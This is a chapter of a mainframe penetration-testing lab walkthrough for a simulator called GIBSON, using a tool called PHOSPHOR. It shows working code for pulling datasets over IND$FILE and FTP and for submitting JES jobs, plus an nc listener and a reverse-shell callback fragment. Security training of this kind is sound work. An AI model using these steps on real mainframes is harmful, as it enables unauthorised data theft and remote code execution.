# Chapter 13 — Lab Walkthrough: Data Exfiltration, Reverse Shells & Reporting

*A hands-on companion to "Hacking Mainframes / Learn The Mainframe With Gibson".
Where Chapter 11 drove the CICS kill chain with CICSpwn, this chapter uses
PHOSPHOR as the cockpit: enumerating with the recon menu, stealing data over three
different protocols, landing a reverse shell, and turning the whole thing into a
client-ready report. Every command has been exercised against GIBSON.*

*This is a defensive training lab. The target (GIBSON) is a simulator full of
fake data. Only run these techniques against systems you are authorised to test.*

---

## 0. Setup

Start GIBSON (TN3270 :23, FTP :21, DB2/DRDA :50000) and set `TARGET` to its
address. Install PHOSPHOR (`pip install -e ".[crt]"`). Lab credentials (fake):
`IBMUSER / SYS1`.

---

## 1. Enumerate from one console — the recon menu

Instead of memorising nmap switches, drive everything from the menu:

```
python -m phosphor $TARGET --menu
```

Work top to bottom: **TN3270 screen capture** to confirm the host, **VTAM applid
enumeration** to find TSO/CICS/DB2, then **TSO user enumeration**. When TSO enum
asks for a `users.txt` you don't have, the built-in notepad opens — `:seed users`
gives you a starter list of common mainframe IDs, add your own, `:save`. The scan
then reports which IDs are valid.

Each scan runs with PHOSPHOR's **native engine** (no nmap needed) or prints the
exact `nmap --script ...` command if you'd rather run it there. As you go, answer
"yes" to collect findings — they accumulate for the report in section 6.

---

## 2. Data theft #1 — IND$FILE over the 3270 session

IND$FILE is the file-transfer protocol built into TSO. PHOSPHOR logs into the
TSO/E LOGON panel, reaches READY, and moves datasets:

```python
from phosphor.protocols.tn3270.client import TN3270Client
from phosphor.protocols.tn3270.tso import tso_login
from phosphor.protocols.indfile.dft import IndFileClient

c = TN3270Client(); c.connect(TARGET, 23)
tso_login(c, "IBMUSER", "SYS1")                 # navigates the panel to READY
data = IndFileClient(c).get("IBMUSER.SEED.TEXT")  # download a dataset
# ASCII transfers arrive EBCDIC-encoded; decode for text:
print(data.decode("cp037").replace("\x15", "\n"))
```

Upload works the same way with `.put(dsn, bytes)`. IND$FILE uses the standard DFT
structured-field protocol, so it behaves identically under any 3270 emulator's
File-Transfer — PHOSPHOR is just scripting it.

---

## 3. Data theft #2 — FTP, and a second code-execution path

Mainframe FTP is often the easier win, and it exposes the JES job interface:

```python
from phosphor.protocols.ftp.client import MainframeFTP
f = MainframeFTP(); f.connect(TARGET, 21)
f.login("IBMUSER", "SYS1")
print(f.list())                       # dataset listing
f.get("GIBSON.BANK.ACCOUNTS")         # download
f.submit_jcl(b"//J JOB (ACCT),CLASS=A\n//S EXEC PGM=IEFBR14\n")   # SITE FILETYPE=JES
```

From the menu, **Anonymous FTP check** flags whether anonymous login is allowed —
on a vulnerable configuration it is, which is a finding in its own right.

---

## 4. Data theft #3 — fingerprinting DB2 over DRDA

The DB2 listener answers a DRDA EXCSAT probe with its identity — server name and
exact version, which drives targeted follow-up:

```
menu -> DB2 DRDA info
[INFO ] DB2 DRDA server identified
        Server GIBSONDB2, release DSN12015 (DB2 12), DDF DB2A
```

---

## 5. Post-exploitation — landing a reverse shell

Chapter 11 submitted a reverse-shell job through CICS SPOOL. Here we watch it land.
Start a listener (cicspwn's `-s`, or a plain `nc`):

```
nc -lvnp 4444
```

Submit the reverse-shell JCL (the REXX stub carries `rh='<you>';rp='4444'`).
When GIBSON runs the job it dials back to your listener and drops you into a
simulated OMVS/TSO shell:

```
GIBSON z/OS UNIX System Services
IBMUSER:/u/ibmuser$ id
uid=10535(IBMUSER) gid=335(IBMUSER) groups=335(IBMUSER)
IBMUSER:/u/ibmuser$ uname
OS/390
```

Everything the shell "runs" is simulated against fake data, and GIBSON only ever
connects back to a loopback/RFC1918 listener — but the student sees the exact
behaviour of a real reverse shell landing.

---

## 6. Reporting — turn findings into a deliverable

Everything collected in the menu (or a full `--scan`) exports to an executive-ready
report:

```
python -m phosphor $TARGET --scan --report assessment.html
python -m phosphor $TARGET --scan --report assessment.md
```

You get a severity summary, findings grouped high→info with the evidence captured
at each step, and remediation guidance — e.g. the headline *cics-ceci-unauth* maps
to "protect CICS supplied transactions with RACF and require sign-on."

---

## 7. Optional — the cathode-ray terminal

For interactive work with the period aesthetic:

```
python -m phosphor.crt $TARGET --profile boardroom   # gentle
python -m phosphor.crt $TARGET --profile authentic   # full 1980s glass
python -m phosphor.crt --preview ./previews          # stills of every profile (no GPU)
```

Every effect (bloom, burn-in, scanlines, curvature, glow-line, flicker) is dialable
live, so it ranges from full CRT to a flat, readable screen.

---

## Appendix — the data-theft surface at a glance

```
recon menu ─┬─ IND$FILE (3270)  ── datasets in/out at TSO READY
            ├─ FTP (:21)        ── listing, download, and JES submit (RCE path)
            └─ DB2 DRDA (:50000)── server + version fingerprint
CICS SPOOL ── reverse-shell JCL ── connect-back ── simulated OMVS/TSO shell
                                        ▼
                                   report (HTML / Markdown)
```

**Defensive takeaways:** restrict IND$FILE and FTP to authenticated users and lock
the JES interface (`SITE FILETYPE=JES`); disable anonymous FTP; restrict the DRDA
listener to trusted networks; monitor INTRDR job submissions from CICS terminals;
and enforce strong TSO authentication with MFA.

*Lab only. Fake data. Authorised testing.*
